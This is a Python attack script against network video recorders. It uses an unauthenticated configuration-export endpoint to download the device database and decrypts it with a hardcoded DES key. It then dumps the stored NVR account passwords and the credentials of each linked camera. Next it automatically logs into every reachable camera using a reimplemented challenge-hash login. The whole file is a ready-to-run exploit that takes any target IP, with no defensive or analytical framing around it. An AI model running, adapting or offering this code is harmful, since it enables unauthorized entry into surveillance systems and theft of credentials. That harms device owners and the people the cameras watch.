#!/usr/bin/env python3
"""
Lab t4rg3d - NVR H4rv3st3r & Camera Verifier (v8)
1. Harvests Device Info and Decrypts DB via Pre-Auth RCE.
2. Extracts Camera IPs and Credentials.
3. Performs ICMP Ping check to avoid hanging on dead nodes.
4. Automatically verifies Camera access using 'Shifted Bit' (Auth v6) logic.
"""

import sys
import base64
import sqlite3
import requests
import os
import hashlib
import time
import subprocess
import platform
from Crypto.Cipher import DES

# Lab t4rg3d 
_K = [0x31, 0x33, 0x31, 0x34]
DES_KEY = bytes(_K + _K)  
CHROME_UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"

def is_online(ip):
    """Pings the target IP once to check if it's reachable."""
    param = '-n' if platform.system().lower() == 'windows' else '-c'
    command = ['ping', param, '1', '-W', '2', ip]
    try:
        return subprocess.call(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0
    except:
        return False

def round_five(hex_hash):
    """The Lab t4rg3d 'Shifted Bit' - extracting 16 chars from index 22."""
    return hex_hash[22:38]

def verify_camera_access(cam_ip, user, password):
    """Attempts to verify credentials against a camera (verbose crypto output)."""
    print(f"\n[*] INITIATING MULTI-VECTOR AUTH VERIFICATION: {cam_ip}")
    
    if not is_online(cam_ip):
        print(f"    [-] OFFLINE: Host {cam_ip} is unreachable (ping failed). Skipping.")
        return "OFFLINE"
        
    print(f"    [+] Host ONLINE. Target: {user} | Pass: {password}")
    base_url = f"http://{cam_ip}"
    
    try:
        print("    [1] Fetching login capabilities...")
        payload = {"action": "get", "data": {"username": user}}
        r = requests.post(f"{base_url}/api/session/login-capabilities", json=payload, headers={"User-Agent": CHROME_UA, "Connection": "close"}, timeout=5)
        
        if r.status_code != 200:
            print(f"    [-] UNREACHABLE: Camera at {cam_ip} failed to respond (HTTP {r.status_code}).")
            return "UNREACHABLE"
        
        resp_json = r.json()
        if resp_json.get("code") != 0:
            print(f"    [-] FAILED: Capabilities error: {resp_json.get('msg')}")
            return "ERROR"
            
        data = resp_json.get("data", {})
        param = data.get("param", {})
        salt = param.get("salt", "")
        challenge = param.get("challenge", "")
        session_id = data.get("sessionID", "")
        
        now = time.strftime("%Y-%m-%dT%H:%M:%S")
        ts_b64 = base64.b64encode(now.encode("ascii")).decode("ascii")
        
        print(f"    [2] Simulation Data: Salt={salt} | Challenge={challenge[:10]}... | TS={ts_b64[:14]}...")
        
        h1 = hashlib.sha256(f"{user}{salt}{ts_b64}{password}".encode("latin1")).hexdigest()
        print(f"    [Step 1] Hash (User+Salt+TS+Pass): {h1}")
        
        h2 = hashlib.sha256(bytes.fromhex(h1) + challenge.encode("latin1")).hexdigest()
        print(f"    [Step 2] Hash (Bin(H1)+Challenge): {h2}")
        
        final_pass = round_five(h2)
        print(f"    [Step 3] Shifted Password (16 chars): {final_pass}")
        
        print("    [3] Executing Multi-Vector Authentication...")
        
        # Variant A: Shifted Bit (Newer API, e.g. NVR)
        login_data_a = {
            "userName": user,
            "password": final_pass,
            "loginEncryptionType": "sha256-1",
            "sessionID": session_id
        }
        
        # Variant B: Full Hash (Older IPC API, e.g. .26)
        login_data_b = {
            "action": "set",
            "data": {
                "username": user,
                "password": h2,
                "loginEncryptionType": "sha256-1",
                "sessionID": session_id,
                "datetime": now
            }
        }
        
        try:
            # Try Variant B first as it's the standard for IPCs like .26
            r_login = requests.post(f"{base_url}/api/session/login", json=login_data_b, headers={"User-Agent": CHROME_UA, "Connection": "close"}, timeout=5)
            if r_login.status_code == 200 and r_login.json().get("code") == 0:
                print("    [+] VERIFIED: Access Granted (Legacy Full Hash Mode).")
                return "VERIFIED (Full Hash)"
                
            # Fallback to Variant A
            r_login = requests.post(f"{base_url}/api/session/login", json=login_data_a, headers={"User-Agent": CHROME_UA, "Connection": "close"}, timeout=5)
            if r_login.status_code == 200 and r_login.json().get("code") == 0:
                print("    [+] VERIFIED: Access Granted (Modern Shifted Bit).")
                return "VERIFIED (Shifted Bit)"
                
            err_code = r_login.json().get("code", "UNKNOWN")
            print(f"    [-] FAILED: Server returned code {err_code}.")
            return f"FAILED ({err_code})"
        except requests.exceptions.Timeout:
            print("    [-] TIMEOUT: Server stopped responding during login.")
            return "TIMEOUT"
            
    except Exception as e:
        print(f"    [-] ERROR: {e!s}")
        return "ERROR"

def harvest_and_verify(target_ip):
    print(f"[*] INITIATING DEEP HARVEST: {target_ip}...")
    
    url = f"http://{target_ip}/api/system/import-export"
    try:
        r = requests.post(url, json={"action": "get"}, headers={"User-Agent": CHROME_UA, "Connection": "close"}, timeout=10)
        data = r.json()
        if data.get('code') != 0:
            print(f"[-] NVR DB Extraction Failed: {data.get('message')}")
            return
            
        raw_b64 = data['data']['configureFile']
        raw_bin = base64.b64decode(raw_b64)
        cipher = DES.new(DES_KEY, DES.MODE_ECB)
        decrypted = cipher.decrypt(raw_bin[12:])
        
        db_path = f"/tmp/{target_ip}_harvest.db"
        with open(db_path, "wb") as f: f.write(decrypted)
        
        conn = sqlite3.connect(db_path)
        cur = conn.cursor()
        
        # ODCZYT MODELU I WERSJI BEZPOŚREDNIO Z BAZY DANYCH
        nvr_model = "Unknown"
        nvr_fw = "Unknown"
        try:
            cur.execute("SELECT device_name FROM t_general_config_info")
            row = cur.fetchone()
            if row: nvr_model = row[0]
            
            cur.execute("SELECT version FROM t_version")
            row = cur.fetchone()
            if row: nvr_fw = row[0]
        except Exception as e:
            pass
        
        print("\n" + "="*85)
        print(" T4rg3d l4b")
        print(f" NVR H4RV3ST3R REPORT: {target_ip}")
        print(f" NVR MODEL: {nvr_model} | FW: {nvr_fw}")
        print("="*85)
        
        # NVR Accounts
        print("\n[+] LOCAL NVR ACCOUNTS:")
        cur.execute("SELECT username, password FROM t_user_node")
        accounts = cur.fetchall()
        for row in accounts:
            print(f"  - {row[0]:<15} : {row[1]}")
            
        # Camera Nodes and Verification
        print("\n[+] CAMERA NODES RECONNAISSANCE:")
        try:
            cur.execute("SELECT name, ip, username, password FROM t_channel_node WHERE enable=1")
            cameras = cur.fetchall()
            
            if not cameras:
                print("  No enabled cameras found in database.")
            
            verification_results = []
            for cam in cameras:
                name, ip, user, pwd = cam
                status = verify_camera_access(ip, user, pwd)
                verification_results.append((name, ip, user, pwd, status))
            
            # Final Summary Table
            print("\n" + "="*85)
            print(f" FINAL VERIFICATION SUMMARY FOR {target_ip}")
            print("="*85)
            print(f" {'NAME':<10} | {'IP ADDRESS':<15} | {'USER':<8} | {'PASS':<15} | {'RESULT'}")
            print("-" * 85)
            for res in verification_results:
                print(f" {res[0]:<10} | {res[1]:<15} | {res[2]:<8} | {res[3]:<15} | {res[4]}")
            
        except Exception as e:
            print(f"[-] Camera node extraction error: {e}")
            
        print("="*85)
        conn.close()
        os.remove(db_path)
        print("[*] Task complete. Temporary database purged.")

    except Exception as e:
        print(f"[-] Critical Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <NVR_IP>")
        sys.exit(1)
    harvest_and_verify(sys.argv[1])
